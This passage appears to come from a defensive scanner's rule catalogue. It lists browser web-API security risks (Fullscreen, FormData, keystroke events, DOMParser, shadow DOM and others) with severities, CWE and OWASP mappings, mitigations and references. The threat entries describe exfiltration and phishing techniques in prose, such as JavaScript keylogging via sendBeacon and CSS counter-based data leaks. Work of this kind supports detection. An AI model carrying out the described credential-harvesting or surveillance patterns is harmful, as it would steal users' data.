            "Limit freeze event handlers to state persistence only — do not transmit data to analytics in freeze handlers",
            "Audit visibilitychange listeners for unnecessary analytics transmission",
            "Remove keydown/input event listeners when document.hidden is true",
        ],
        "references": ["https://wicg.github.io/page-lifecycle/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "document_picture_in_picture_security": {
        "severity": "HIGH",
        "short": "Document Picture-in-Picture Security",
        "cwe": "CWE-1021", "owasp": "A03:2021",
        "threats": [
            "documentPictureInPicture.requestWindow() triggered automatically: unprompted floating window created without user interaction",
            "Document PiP window displays auth/login/payment form: floating browser window used to spoof trusted UI and phish credentials",
            "PiP configuration from URL parameter: attacker-controlled window size and content in floating overlay",
            "Data exfiltrated on enterpictureinpicture event: PiP entry triggers covert data transmission",
        ],
        "mitigations": [
            "Never call documentPictureInPicture.requestWindow() without a direct user gesture",
            "Do not display authentication or payment forms inside Document PiP windows",
            "Validate all PiP window configuration parameters — never source from URL query values",
        ],
        "references": ["https://wicg.github.io/document-picture-in-picture/", "https://cwe.mitre.org/data/definitions/1021.html"],
    },
    "image_decoder_security": {
        "severity": "HIGH",
        "short": "ImageDecoder (WebCodecs) Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Decoded ImageDecoder frame pixel data transmitted to remote: image content extracted via WebCodecs and exfiltrated",
            "ImageDecoder data source from URL parameter: attacker-controlled image bytes fed to hardware decoder",
            "Image decode timing measured and transmitted: hardware decoder latency used as device timing oracle",
            "Cross-origin image data decoded via WebCodecs: images loaded from cross-origin without CORP protection",
        ],
        "mitigations": [
            "Never transmit ImageDecoder result pixels to remote endpoints",
            "Validate all image data sources — never derive from URL query parameters",
            "Apply Cross-Origin-Resource-Policy headers to protect media resources from cross-origin WebCodecs access",
        ],
        "references": ["https://www.w3.org/TR/webcodecs/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "audio_decoder_security": {
        "severity": "HIGH",
        "short": "AudioDecoder / AudioEncoder (WebCodecs) Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "AudioData frame content transmitted to remote: decoded audio buffer content exfiltrated via WebCodecs",
            "AudioDecoder/AudioEncoder configured from URL parameter: attacker-controlled codec string passed to hardware decoder",
            "Audio decode timing oracle: codec latency differences transmitted to profile hardware capabilities",
            "AudioEncoder connected to microphone with network transmission: microphone audio encoded and sent to attacker endpoint",
        ],
        "mitigations": [
            "Do not transmit AudioData buffer content to remote endpoints outside explicitly user-consented flows",
            "Validate all AudioDecoder/AudioEncoder codec parameters — never source from URL parameters",
            "Never connect AudioEncoder output to network transmission without explicit user recording consent",
        ],
        "references": ["https://www.w3.org/TR/webcodecs/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "highlight_api_security": {
        "severity": "MEDIUM",
        "short": "CSS Custom Highlight API Security",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "threats": [
            "Highlight range sourced from URL parameter: attacker-controlled text selection range applied via CSS Highlight API",
            "Highlight registry state transmitted to remote: CSS.highlights used as covert data exfiltration channel",
            "Highlight applied to password/token/SSN content: sensitive text fields targeted via programmatic highlight range",
            "Highlight registry combined with innerHTML/document.write: DOM injection coupled with highlight manipulation",
        ],
        "mitigations": [
            "Never derive CSS Highlight range boundaries from URL parameters or untrusted input",
            "Do not transmit CSS.highlights state to remote analytics endpoints",
            "Avoid applying programmatic highlights to fields containing passwords, tokens, or PII",
        ],
        "references": ["https://www.w3.org/TR/css-highlight-api-1/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "element_internals_security": {
        "severity": "HIGH",
        "short": "ElementInternals API Security",
        "cwe": "CWE-20", "owasp": "A03:2021",
        "threats": [
            "setFormValue() sourced from URL parameter: attacker-controlled form submission value via custom element internals",
            "ElementInternals form value contains credentials transmitted remotely: sensitive data exfiltrated through custom form element",
            "setValidity({}) with empty flags: custom element bypasses all form constraint validation silently",
            "internals.form.action modified dynamically: form submission endpoint hijacked via ElementInternals API",
        ],
        "mitigations": [
            "Never derive setFormValue() values from URL parameters or untrusted input",
            "Use setValidity() with explicit flags only — never pass empty object to bypass validation",
            "Do not allow dynamic modification of internals.form action attributes from user-controlled sources",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/custom-elements.html#the-elementinternals-interface", "https://cwe.mitre.org/data/definitions/20.html"],
    },
    "declarative_shadow_dom_security": {
        "severity": "HIGH",
        "short": "Declarative Shadow DOM Security",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "setHTMLUnsafe()/shadowrootmode from URL parameter: attacker-controlled shadow root content injection",
            "Script/eval/innerHTML inside open shadow root: JavaScript execution achieved within shadow DOM boundary",
            "Shadow DOM hosts credentials and transmits them remotely: sensitive form data harvested via shadow root",
            "setHTMLUnsafe() with user-controlled innerHTML: bypass of browser's built-in HTML sanitization",
        ],
        "mitigations": [
            "Never source setHTMLUnsafe() content from URL parameters or user input — use setHTML() with sanitization instead",
            "Apply strict CSP to prevent script injection into shadow roots",
            "Prefer closed shadow roots over open where external JS access is not needed",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/scripting.html#the-template-element", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "animation_worklet_security": {
        "severity": "MEDIUM",
        "short": "Animation Worklet (Houdini) Security",
        "cwe": "CWE-94", "owasp": "A01:2021",
        "threats": [
            "animationWorklet.addModule() URL from URL parameter: attacker-controlled animation worklet code loaded and executed",
            "Animation worklet loaded from external third-party URL: untrusted code runs in worklet sandbox with timing access",
            "WorkletAnimation timing values transmitted remotely: animation timeline precision used as cross-origin timing channel",
            "registerAnimator computed timing data exfiltrated: animation worklet exposes high-resolution timing to remote",
        ],
        "mitigations": [
            "Never source animationWorklet.addModule() URLs from URL parameters — use static paths only",
            "Only load animation worklet modules from same-origin trusted sources",
            "Do not transmit animation currentTime/localTime values to remote analytics",
        ],
        "references": ["https://drafts.css-houdini.org/css-animationworklet/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "fullscreen_security": {
        "severity": "HIGH",
        "short": "Fullscreen API Security",
        "cwe": "CWE-1021", "owasp": "A03:2021",
        "threats": [
            "requestFullscreen() triggered automatically on page load: fullscreen entered without user gesture, violating security policy",
            "Fullscreen combined with auth/login/payment content: attacker spoofs browser chrome in fullscreen to phish credentials",
            "keyboard.lock() combined with fullscreen: user navigation escape paths locked, trapping user in fake fullscreen UI",
            "Data exfiltrated on fullscreenchange event: fullscreen entry used as covert trigger for analytics/exfiltration calls",
        ],
        "mitigations": [
            "Never call requestFullscreen() without a direct synchronous user gesture",
            "Display clear browser-native indicators when in fullscreen — do not suppress status bar",
            "Do not combine fullscreen with keyboard lock on pages displaying authentication or payment UI",
        ],
        "references": ["https://fullscreen.spec.whatwg.org/", "https://cwe.mitre.org/data/definitions/1021.html"],
    },
    "handwriting_recognition_security": {
        "severity": "HIGH",
        "short": "Handwriting Recognition API Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Handwriting stroke/drawing data transmitted remotely: user handwriting input (passwords, PINs, sensitive notes) exfiltrated",
            "HandwritingRecognizer language/hints configuration transmitted: recognizer settings reveal user locale and input preferences",
            "createHandwritingRecognizer() from URL parameter: attacker-controlled recognizer configuration injected",
            "Continuous HandwritingStroke capture with network exfil: covert ongoing handwriting surveillance stream",
        ],
        "mitigations": [
            "Never transmit HandwritingDrawing stroke data to remote endpoints without explicit user consent",
            "Do not source createHandwritingRecognizer() parameters from URL query values",
            "Rate-limit or scope handwriting recognition to specific user-initiated interactions only",
        ],
        "references": ["https://wicg.github.io/handwriting-recognition/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "presentation_api_security": {
        "severity": "HIGH",
        "short": "Presentation API Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "PresentationRequest URL from URL parameter: attacker controls which content is cast to the connected screen",
            "PresentationConnection.send() exfiltrates session/cookie/token data: auth credentials sent to secondary display context",
            "Auth/credential/payment content cast to external screen: sensitive data presented on potentially untrusted display",
            "presentationRequest.start() auto-triggered: unprompted screen casting initiation without user awareness",
        ],
        "mitigations": [
            "Never derive PresentationRequest URLs from URL parameters — use static allowlisted presentation URLs",
            "Do not transmit authentication tokens or session credentials over PresentationConnection channels",
            "Ensure presentationRequest.start() is only called in direct response to an explicit user gesture",
        ],
        "references": ["https://w3c.github.io/presentation-api/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "css_typed_om_security": {
        "severity": "MEDIUM",
        "short": "CSS Typed Object Model Security",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "threats": [
            "CSS.px/em/percent value from URL parameter: attacker-controlled typed CSS numeric values injected into element style",
            "computedStyleMap() results transmitted to remote: typed computed CSS values used for cross-origin style surveillance",
            "Typed CSS values used for device fingerprinting: DPI, font size, and zoom level reveal platform/device characteristics",
            "attributeStyleMap.set() with innerHTML/userInput: typed CSS property set to attacker-controlled untrusted content",
        ],
        "mitigations": [
            "Never source CSS Typed OM values from URL parameters — validate numeric ranges before applying",
            "Do not transmit computedStyleMap() results to remote analytics endpoints",
            "Treat CSS Typed OM computed property values as fingerprinting data — handle with same care as navigator properties",
        ],
        "references": ["https://drafts.css-houdini.org/css-typed-om/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "popover_api_security": {
        "severity": "HIGH",
        "short": "Popover API Security",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "URL parameter flows into popover content before showPopover(): attacker controls popover displayed content via query string",
            "Popover opened displaying auth/login/payment content: popover UI used to present fake credential or payment form",
            "innerHTML/insertAdjacentHTML before showPopover(): unsanitized HTML injected into popover without sanitization",
            "showPopover() triggered automatically on page load: popover shown without user gesture violating security UX",
        ],
        "mitigations": [
            "Sanitize all popover content before calling showPopover() — never insert URL parameter values directly into popover DOM",
            "Do not display authentication, payment, or credential forms inside popover elements",
            "Only call showPopover() in direct response to explicit user interactions",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/popover.html", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "remote_playback_security": {
        "severity": "MEDIUM",
        "short": "Remote Playback API Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "remote.state transmitted to analytics: cast device playback state reveals user media consumption patterns",
            "watchAvailability() result exfiltrated: cast device availability reveals home network topology and smart TV presence",
            "remote.prompt() controlled by URL parameter: attacker-controlled screen casting target configuration",
            "remote.prompt() auto-triggered on page load: unprompted cast dialog shown without user interaction",
        ],
        "mitigations": [
            "Do not transmit RemotePlayback.state to analytics endpoints — treat cast state as sensitive user behaviour data",
            "Do not transmit watchAvailability() results — casting device presence reveals home network configuration",
            "Never trigger remote.prompt() without a direct user gesture",
        ],
        "references": ["https://w3c.github.io/remote-playback/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "layout_worklet_security": {
        "severity": "MEDIUM",
        "short": "CSS Layout Worklet (Houdini) Security",
        "cwe": "CWE-94", "owasp": "A01:2021",
        "threats": [
            "layoutWorklet.addModule() URL from URL parameter: attacker-controlled CSS layout worklet code loaded and executed",
            "Layout worklet loaded from external third-party URL: untrusted code executes in CSS layout context with document access",
            "Layout timing values transmitted: registerLayout() computation time used as cross-origin covert timing channel",
            "display:layout() worklet name from URL parameter: attacker selects which layout algorithm applies to page elements",
        ],
        "mitigations": [
            "Never source CSS.layoutWorklet.addModule() URLs from URL parameters — use static same-origin paths",
            "Only load layout worklets from same-origin trusted sources",
            "Do not transmit performance.now() measurements from within registerLayout() callbacks",
        ],
        "references": ["https://drafts.css-houdini.org/css-layout-api/", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "dialog_element_security": {
        "severity": "HIGH",
        "short": "Dialog Element Security",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "URL parameter content flows into showModal(): attacker-controlled text displayed in trusted modal dialog",
            "showModal() displays auth/login/payment form: native modal dialog spoofed as browser-trusted credential prompt",
            "innerHTML injected before showModal(): unsanitized HTML executed in modal dialog context",
            "dialog.returnValue transmitted to remote: form result (user input to dialog) exfiltrated to analytics",
        ],
        "mitigations": [
            "Sanitize all content before calling showModal() — never insert URL parameters into dialog innerHTML",
            "Do not transmit dialog.returnValue to remote analytics — treat dialog form results as sensitive user input",
            "Apply Content Security Policy to restrict script execution within dialog elements",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/interactive-elements.html#the-dialog-element", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "font_access_security": {
        "severity": "HIGH",
        "short": "Font Access API Security (Local Font Fingerprinting)",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Local font list transmitted for fingerprinting: installed fonts create persistent cross-site device identifier",
            "queryLocalFonts() with no filter: complete font inventory enumerated to maximise fingerprinting entropy",
            "FontData list exfiltrated to remote endpoint: full installed font set sent to attacker-controlled server",
            "queryLocalFonts() filter from URL parameter: attacker probes for specific fonts to infer installed software",
        ],
        "mitigations": [
            "Never transmit local font lists to remote analytics — treat installed fonts as sensitive device fingerprinting data",
            "Prompt users before granting Font Access API permissions for any origin",
            "Consider restricting Font Access API to user-initiated actions with explicit consent dialogs",
        ],
        "references": ["https://wicg.github.io/local-font-access/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "content_visibility_security": {
        "severity": "MEDIUM",
        "short": "Content Visibility API Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "contentvisibilityautostatechange + performance.now() transmitted: rendering skip state used as cross-origin timing oracle",
            "content-visibility property from URL parameter: attacker controls which elements are skipped from rendering",
            "contentVisibility skip/hidden state transmitted remotely: rendering pipeline state exfiltrated as covert channel",
            "contain-intrinsic-size characteristics transmitted for fingerprinting: rendering geometry used as device identifier",
        ],
        "mitigations": [
            "Do not transmit contentvisibilityautostatechange event timing to remote analytics",
            "Never source content-visibility CSS values from URL parameters",
            "Treat rendering skip state as internal browser state — do not expose via analytics beacons",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "inert_security": {
        "severity": "HIGH",
        "short": "Inert Attribute Security",
        "cwe": "CWE-1021", "owasp": "A03:2021",
        "threats": [
            "inert applied to form/login/auth elements: all interaction with authentication UI programmatically blocked",
            "inert combined with iframe/overlay/z-index: clickjacking variant using inert to prevent interaction with obscured legitimate UI",
            "inert attribute controlled by URL parameter: attacker disables specific UI elements via query string manipulation",
            "inert removed via URL parameter: attacker re-enables previously hidden or disabled UI elements",
        ],
        "mitigations": [
            "Never drive inert attribute state from URL parameters or untrusted input",
            "Audit all .inert = true assignments on form/button/input elements for security implications",
            "Do not use inert combined with absolute-positioned overlays without explicit security review",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/interaction.html#the-inert-attribute", "https://cwe.mitre.org/data/definitions/1021.html"],
    },
    "scroll_snap_security": {
        "severity": "MEDIUM",
        "short": "CSS Scroll Snap / Scroll Position Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "scrollY/scrollTop position transmitted to remote analytics: continuous scroll behaviour used for user surveillance",
            "scrollIntoView() targets password/auth/token element: sensitive form fields programmatically revealed to viewport",
            "scroll-snap properties injected via insertRule/innerHTML: dynamic scroll snap manipulation via DOM injection",
            "scroll-snap-type controlled by URL parameter: attacker-controlled scroll snapping behaviour applied to page",
        ],
        "mitigations": [
            "Do not transmit scroll position to remote analytics — treat scrollY/scrollTop as sensitive user behaviour data",
            "Audit scrollIntoView() calls on sensitive field selectors",
            "Validate dynamic CSS insertRule inputs before applying scroll-snap values",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scroll_snap", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "color_scheme_security": {
        "severity": "MEDIUM",
        "short": "Color Scheme / Media Preference Fingerprinting",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "prefers-color-scheme matchMedia result transmitted: dark/light mode preference used as cross-site persistent fingerprint",
            "prefers-reduced-motion/contrast/forced-colors batch probed and transmitted: full OS accessibility preference profile leaked",
            "forced-colors accessibility state exfiltrated: accessibility-mode detection used for user profiling",
            "color-scheme preference controlled via URL parameter: attacker-controlled theme override",
        ],
        "mitigations": [
            "Never transmit matchMedia() results for prefers-color-scheme/reduced-motion/contrast to remote analytics",
            "Treat OS media preferences as sensitive fingerprinting data equivalent to hardware characteristics",
            "Do not combine multiple media preference probes into a transmitted profile",
        ],
        "references": ["https://www.w3.org/TR/mediaqueries-5/", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "focus_management_security": {
        "severity": "MEDIUM",
        "short": "Focus Management Security",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "Programmatic focus() on password/auth/card/SSN field: auto-focus draws user to sensitive input without consent",
            "tabIndex=-1/0 combined with iframe/overlay/modal: focus trapping locks user within attacker-controlled UI",
            "document.activeElement exfiltrated to remote endpoint: focused element reveals user interaction and navigation patterns",
            "tabIndex value sourced from URL parameter: attacker-controlled keyboard navigation order enables tab-jacking",
        ],
        "mitigations": [
            "Audit programmatic focus() calls on sensitive fields for consent and UX legitimacy",
            "Prevent tabIndex manipulation via URL parameters",
            "Do not transmit document.activeElement or focus events to analytics endpoints",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/focus", "https://cwe.mitre.org/data/definitions/693.html"],
    },
    "css_counter_security": {
        "severity": "LOW",
        "short": "CSS Counter Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "counter() value embedded in CSS url() or content: counter-based side-channel leaks element state to attacker-controlled endpoint",
            "counter-reset/increment value from URL parameter: attacker-controlled CSS counter state",
            "CSS counter injected via insertRule/innerHTML: dynamic counter manipulation via DOM injection",
            "CSS counter names reference password/token/auth elements: sensitive element enumeration via counter naming conventions",
        ],
        "mitigations": [
            "Avoid using counter() in url() CSS properties — this is a known CSS exfiltration technique",
            "Sanitize CSS property values derived from URL parameters",
            "Content Security Policy blocks inline style injection",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/CSS/counter", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "form_data_api_security": {
        "severity": "HIGH",
        "short": "FormData API Security",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "FormData containing password/token/credential sent via fetch/sendBeacon: credential exfiltration via form harvesting",
            "FormData submitted to third-party external URL: user form data including PII sent to non-same-origin endpoint",
            "FormData values sourced from URL parameters: attacker-controlled form field values injected into submission",
            "new FormData(form) all fields harvested and transmitted: complete form including hidden fields exfiltrated",
        ],
        "mitigations": [
            "Audit all FormData submissions — verify destination URLs are same-origin or trusted partners",
            "Never include raw password/token fields in FormData transmitted to analytics",
            "Restrict form submission endpoints via Content Security Policy connect-src",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/FormData", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "custom_element_registry_security": {
        "severity": "HIGH",
        "short": "Custom Element Registry Security",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "customElements.define() tag name from URL parameter: attacker-controlled custom element registration enables prototype pollution",
            "customElements.define() registers builtin elements (input/form/button): builtin HTML element behaviour override attack",
            "connectedCallback() exfiltrates document/shadowRoot/innerHTML to remote: custom element lifecycle used for DOM exfiltration",
            "attributeChangedCallback() processes URL params/innerHTML/eval: attacker-controlled attribute triggers code execution",
        ],
        "mitigations": [
            "Never source customElements.define() tag names from URL parameters or user input",
            "Do not define custom elements that shadow or override native HTML element names",
            "Review connectedCallback()/attributeChangedCallback() for data exfiltration and eval() usage",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/CustomElementRegistry", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "css_grid_security": {
        "severity": "LOW",
        "short": "CSS Grid Security",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "grid-template-areas/columns/rows from URL parameter: attacker-controlled CSS grid layout injection enabling UI redressing",
            "CSS Grid template injected via insertRule/innerHTML/setAttribute: dynamic grid manipulation via DOM injection",
            "performance.now() timing around grid layout changes with fetch: CSS Grid timing oracle for cross-origin state inference",
            "grid-area value from URL parameter: attacker-controlled element placement within CSS Grid container",
        ],
        "mitigations": [
            "Sanitize CSS property values derived from URL parameters; never apply grid-template values from user input",
            "Content Security Policy prevents inline style injection via style-src directive",
            "Avoid exposing layout timing measurements via analytics or remote endpoints",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Grid_Layout", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "document_fragment_security": {
        "severity": "HIGH",
        "short": "Document Fragment / Range API Security",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "createContextualFragment() parses HTML from URL parameter: Range API used as XSS injection vector bypassing standard sanitization",
            "range.insertNode() inserts URL parameter content: attacker-controlled DOM insertion at arbitrary document positions",
            "range.extractContents() transmitted via fetch/sendBeacon: DOM subtree exfiltration via Range extraction API",
            "range.cloneContents() sent to analytics: DOM content surveillance via cloning of document ranges",
        ],
        "mitigations": [
            "Never pass unsanitized URL parameters to createContextualFragment() — sanitize all HTML before Range API use",
            "Use DOMPurify or Trusted Types before inserting user-controlled content via Range insertNode()",
            "Do not transmit extractContents()/cloneContents() results to remote endpoints without explicit user consent",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Range", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "pointer_events_security": {
        "severity": "MEDIUM",
        "short": "Pointer Events Security",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "pointermove events transmitted to analytics: continuous pointer coordinate stream leaks user movement and interaction patterns",
            "Pointer hardware attributes (pressure/tilt/pointerType) fingerprinted: stylus/touch device characteristics used for cross-site fingerprinting",
            "setPointerCapture() followed by remote data exfil: captured pointer events from entire viewport exfiltrated",
            "PointerEvent configuration from URL parameter: attacker-controlled pointer event simulation parameters",
        ],
        "mitigations": [
            "Do not transmit raw pointer coordinates or hardware attributes (pressure/tilt) to analytics",
            "Limit pointermove handler frequency with throttling; avoid sending each event to a remote endpoint",
            "Audit setPointerCapture() usage — capture should not persist beyond the immediate user gesture",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Pointer_events", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "input_event_security": {
        "severity": "HIGH",
        "short": "Input Event Security",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "event.key/code/data transmitted via fetch/sendBeacon: real-time JavaScript keylogger exfiltrates individual keystrokes",
            "Keystroke sequence on password/auth/credential field exfiltrated: sensitive field keylogging captures credentials",
            "beforeinput preventDefault/stopPropagation: keystroke interception can redirect user input to attacker-controlled handler",
            "InputEvent/beforeinput configuration from URL parameter: attacker-controlled input event simulation",
        ],
        "mitigations": [
            "Never transmit individual keystrokes (event.key/code/data) to remote endpoints — this is a keylogger pattern",
            "Audit all keydown/keyup/input event listeners for data exfiltration to analytics or third-party endpoints",
            "Content Security Policy connect-src restricts which endpoints event handlers can transmit data to",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/InputEvent", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "tree_walker_security": {
        "severity": "MEDIUM",
        "short": "TreeWalker / NodeIterator Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "createTreeWalker() filtering for password/auth/credential nodes: DOM traversal targets sensitive elements for content extraction",
            "TreeWalker/NodeIterator nextNode() result transmitted via fetch/analytics: DOM text content exfiltrated via tree traversal API",
            "createTreeWalker() on full document with NodeFilter.SHOW_ALL: entire DOM tree traversal captures all text and attribute nodes",
            "createTreeWalker() parameters from URL parameter: attacker-controlled DOM traversal filter and root selection",
        ],
        "mitigations": [
            "Audit createTreeWalker() usage — traversal of sensitive form elements or password fields is high-risk",
            "Do not transmit TreeWalker nextNode() results to remote endpoints",
            "Avoid using NodeFilter.SHOW_ALL on the full document — restrict traversal scope to the minimum necessary subtree",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/TreeWalker", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "dom_parser_security": {
        "severity": "HIGH",
        "short": "DOMParser / XMLSerializer Security",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "DOMParser.parseFromString() parses HTML/XML from URL parameter: attacker-controlled HTML injection bypassing innerHTML sanitization",
            "DOMParser.parseFromString() result passed to eval()/Function(): parsed DOM script content executed as JavaScript",
            "XMLSerializer.serializeToString() result transmitted via fetch/sendBeacon: full DOM subtree exfiltrated as serialized XML/HTML string",
            "DOMParser.parseFromString() processes HTML containing <script>/event handlers: XSS via DOMParser injection pattern",
        ],
        "mitigations": [
            "Never pass unsanitized URL parameters to DOMParser.parseFromString() — sanitize all HTML input before parsing",
            "Do not pass parseFromString() output to eval() or Function() — treat parsed DOM as untrusted",
            "Avoid transmitting XMLSerializer.serializeToString() results to third-party analytics or remote endpoints",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/DOMParser", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "channel_messaging_security": {
        "severity": "HIGH",
        "short": "MessageChannel / Channel Messaging Security",
        "cwe": "CWE-346", "owasp": "A05:2021",
        "threats": [
            "port.postMessage() sends password/token/secret: sensitive data transmitted over MessageChannel port to potentially untrusted receiver",
            "port.onmessage handler passes data to eval()/innerHTML: cross-context message injection enables code execution or DOM injection",
            "MessageChannel port data transmitted via fetch/sendBeacon: channel communication data forwarded to external endpoint",
            "MessageChannel configuration from URL parameter: attacker-controlled messaging channel parameters",
        ],
        "mitigations": [
            "Never transmit raw password/token/secret values over MessageChannel ports",
            "Validate and sanitize all data received via port.onmessage before processing — treat port messages as untrusted input",
            "Avoid forwarding MessageChannel data to external endpoints without explicit user authorization",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel", "https://cwe.mitre.org/data/definitions/346.html"],
    },
    "css_transitions_security": {
        "severity": "LOW",
        "short": "CSS Transitions / Animations Security",
        "cwe": "CWE-385", "owasp": "A07:2021",
        "threats": [
            "transitionend/transitionstart timing transmitted via fetch: CSS transition timing used as cross-origin side-channel oracle",
            "transition-duration value from URL parameter: attacker-controlled animation timing enables DoS via infinite/slow transitions",
            "CSS transition/animation injected via insertRule/innerHTML: dynamic CSS animation manipulation via DOM injection",
            "@keyframes content from URL parameter: attacker-controlled animation sequence injection via CSS",
        ],
        "mitigations": [
            "Do not transmit CSS transition timing measurements to analytics — this is a timing side-channel pattern",
            "Never source transition-duration or @keyframes from URL parameters without strict validation",
            "Content Security Policy style-src prevents inline style injection that could introduce malicious animations",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Transitions", "https://cwe.mitre.org/data/definitions/385.html"],
    },
    "typed_array_security": {
        "severity": "HIGH",
        "short": "Typed Array Security",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "Uint8Array containing password/token transmitted via fetch/sendBeacon: binary credential data exfiltrated using TypedArray encoding",
            "TypedArray initialized from URL parameter: attacker-controlled binary buffer content injection",
            "TypedArray memory buffer size transmitted: binary memory layout fingerprinting for device identification",
            "WebAssembly.Memory wrapped in Uint8Array and transmitted: complete WASM linear memory contents exfiltrated",
        ],
        "mitigations": [
            "Never encode password/token/credential data in Uint8Array for transmission to analytics or third-party endpoints",
            "Validate all size and content parameters before initializing TypedArrays from user-controlled input",
            "Audit WebAssembly memory access patterns — Uint8Array views of WASM memory should not be transmitted remotely",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "array_buffer_security": {
        "severity": "HIGH",
        "short": "ArrayBuffer / DataView Security",
        "cwe": "CWE-385", "owasp": "A07:2021",
        "threats": [
            "ArrayBuffer containing token/credential transmitted: binary-encoded sensitive data exfiltrated via raw buffer",
            "ArrayBuffer/DataView created from URL parameter: attacker-controlled buffer size enabling DoS or injection",
            "DataView.getUint8/getFloat64 results transmitted to analytics: binary memory value exfiltration",
            "SharedArrayBuffer with Atomics.store/load/notify: shared memory enables high-resolution timing attacks (Spectre-class vulnerability)",
        ],
        "mitigations": [
            "Do not transmit raw ArrayBuffer or DataView contents to remote endpoints without explicit sanitization",
            "SharedArrayBuffer use requires COOP/COEP headers — verify cross-origin isolation is enforced",
            "Avoid exposing DataView read results to analytics or third-party tracking scripts",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer", "https://cwe.mitre.org/data/definitions/385.html"],
    },
    "event_target_security": {
        "severity": "MEDIUM",
        "short": "EventTarget / CustomEvent Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "new CustomEvent() carries password/token/secret in detail payload: sensitive data transmitted via DOM event dispatch to listeners",
            "CustomEvent dispatched with URL parameter payload: attacker-controlled event detail injected into DOM event system",
            "addEventListener handler transmits credentials via fetch/sendBeacon: event listener used as data exfiltration trigger",
            "window.addEventListener for message/storage/focus/blur events transmits to remote: global browser event surveillance",
        ],
        "mitigations": [
            "Never include raw password/token/secret in CustomEvent detail payload",
            "Treat CustomEvent detail as potentially attacker-controlled when sourced from URL parameters",
            "Audit window.addEventListener calls for storage/message events — validate event origin before processing",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/EventTarget", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "proxy_reflect_security": {
        "severity": "HIGH",
        "short": "Proxy / Reflect Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Proxy handler.get trap transmits property reads to analytics: all property accesses on proxied object exfiltrated (read surveillance)",
